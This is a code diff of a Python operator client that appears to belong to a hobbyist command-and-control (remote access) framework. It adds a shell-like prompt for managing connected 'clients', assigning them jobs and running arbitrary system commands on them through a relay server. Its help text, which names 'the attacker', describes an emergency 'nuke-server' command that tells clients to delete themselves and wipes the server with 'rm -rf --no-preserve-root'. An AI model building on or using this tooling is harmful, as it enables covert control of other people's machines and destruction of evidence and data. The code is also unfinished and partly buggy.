@@ -47,7 +47,7 @@ class fclient():
     ##directly interacting with the server
     def server_interact(self):
         ## Populating the lists needed & getting info from server
-        self.client_info_fetch()
+        self.server_info_fetch()
         ## This will be returned to the client later
         
         ## dict - can't do .lower() due to client names being capataliezed. fuck
@@ -69,7 +69,7 @@ class fclient():
 
             else:
                 os.system("clear")
-            self.client_info_fetch()
+            self.server_info_fetch()
             
             self.shellformat("")
             
@@ -91,7 +91,10 @@ class fclient():
         ## 1111111
         elif client_name in self.clients:
             while True:
-                input(f"{client_name}@127.0.0.1:6969$: ")
+                ## 'response =' instead of a direct print so I can pass the variable easier/shorter
+                response = self.client_interact_through_server(input(f"{client_name}@127.0.0.1:6969$: "), client_name)
+                print(response)
+                
             #print("Valid Client. Control not implemented")
             #print("DEBUG: client is in the client list!") if global_debug else None
             #pass
@@ -112,7 +115,6 @@ class fclient():
             print(self.clients)
             print(client_name)
         
-                    
 
     def shellformat(self, results):
         if os.name == "nt":
@@ -139,32 +141,34 @@ class fclient():
 
     ## Interacting with clients via the server as a middle man
     ## Meant to be called per message
-    def client_interact_through_server(self, client_command):
-        if client_command == "stats":
-            stats_list = []
-
-            for client_name, client_instance in self.clients.items():
-                ## Maybe turn into JSON for transport back to safe client
-                stats_string = (
-                    f"Client: {client_name}",
-                    f"Heartbeats: {client_instance.stats_heartbeats}",
-                    f"Heartbeat Interval: {client_instance.stats_heartbeats}",
-                    f"Non wait Jobs run: {client_instance.stats_jobsrun}",
-                    f"Last Checkin: {client_instance.stats_latestcheckin}"
-                )
-
-                #print(stats_string)
-                stats_list.append(f"{stats_string}\n")
-                # access the variable from the client instance
-                variable_value = client_instance.stats_heartbeats
+    ## -> will always return the server response 
+    
+    def client_interact_through_server(self, client_command, client_name):            
+        if client_command == "" or client_command == "help":
+            print(
+                f"Prefix Overview: \n  - 'get': retrieves data from the server.\n  - 'set': set something on the client, or server\n  - 'run': run an action on the client, or the server\n\n" \
                 
-                # do something with the variable value, e.g. print it
-                #print(f"{client_name}: {variable_value}")
+                
+                f"Commands: \n"
+                f"get-data: retrives general data about the client from the server's inventory (does not touch client)\n" \
+                f"get-jobs: Lists all the jobs the *server* knows about. Not all jobs may be supported accross all clients. (see get-jobs-possible command)" 
+                f"get-jobs-possible retrieves the jobs the client can *currently* do. (DOES talk to client)"
+                
+                f"set-job: Sets a job for the current client. Jobs are a set of actions run by the client\n" \
+                f"run-command: runs a singular (one liner) system command on the client. Handy for if there is not a job that runs what you need.\n" \
+                    
+                f"Emergency Comands: \n  - use for EMERGENCIES ONLY, there is no favorable outcome for the attacker with these" \
+                f"nuke-server: Kills the server, tells the clients to delete themselves, and runs 'rm-rf --no-preserve-root' the server machine. "
+            )
+        
+        elif client_command == "get-data":
+            return self.server_request(f"get-data", client_name)
 
-            return stats_list
-            #print(stats_list)
-            #input("Type home for home: ")
-
+        elif client_command == "set-job":
+            return self.server_request(f"set-job", client_name)
+        
+        elif client_command == "run-command":
+            return self.server_request(f"run-command", client_name)
 
 
         else:
@@ -177,18 +181,28 @@ class fclient():
 ################
 ## Server Functions
 ################  
-    ## grabs info and foramts it
-    def client_info_fetch(self):
+    ## grabs info and foramts it, meant to be an easy data-update method
+    def server_info_fetch(self):
         print("Requesting self.clients...")
         self.clients = list(self.server_request("clients").split())
         #self.client_stats = self.server_request("stats")
-
+    
+    ## Grabs (per) client info and formats it
+    '''def client_info_fetch(self, client_name):
+        print("Requesting {client_name} info...")
+        self.client_info = list(self.server_request("clients").split())
+        #self.client_stats = self.server_request("stats")'''
+        
+        
     ## THe main interface for gettin data from the server
     ## will handle all encoding & bs, just pass it the string
-    def server_request(self, request):
-        formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request}"
-
+    ## -> returns the response!
+    
+    def server_request(self, request, client_name=None):
+    
         if request == "clients":
+            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request}"
+            
             print(f"DEBUG: Sending {formatted_request}") if global_debug else None
             self.server.send(self.str_encode(formatted_request))
 
@@ -198,8 +212,20 @@ class fclient():
             serv_response = self.str_decode(self.server.recv(1024))
             print(f"DEBUG: Serv Response: {serv_response}") if global_debug else None
             return serv_response
+        
+        elif "-" in request:
+            formatted_request = f"!_usercommand_!\\|/{self.username}//|\\\\{request} {client_name}"
+            print(f"Formatted request: {formatted_request}")
+            self.server.send(self.str_encode(formatted_request))
+            
+            serv_response = self.str_decode(self.server.recv(1024))
+            print(f"DEBUG: Serv Response: {serv_response}") if global_debug else None
+            return serv_response
+            
+        else:
+            print(f"Invalid Command: {request}")
 
-
+    ## takes creds from friendly client
     def credential_gather(self) -> list:
         ## HA yes this works! init the list with types!
         creds_list = [str, str]
@@ -212,7 +238,6 @@ class fclient():
         return creds_list
         
     ## Doing dedicated encode/decode casuse syntax is easier & cleaner
-
     ## bytes -> str
     def str_decode(self, input) -> str:
         decoded_result = input.decode()
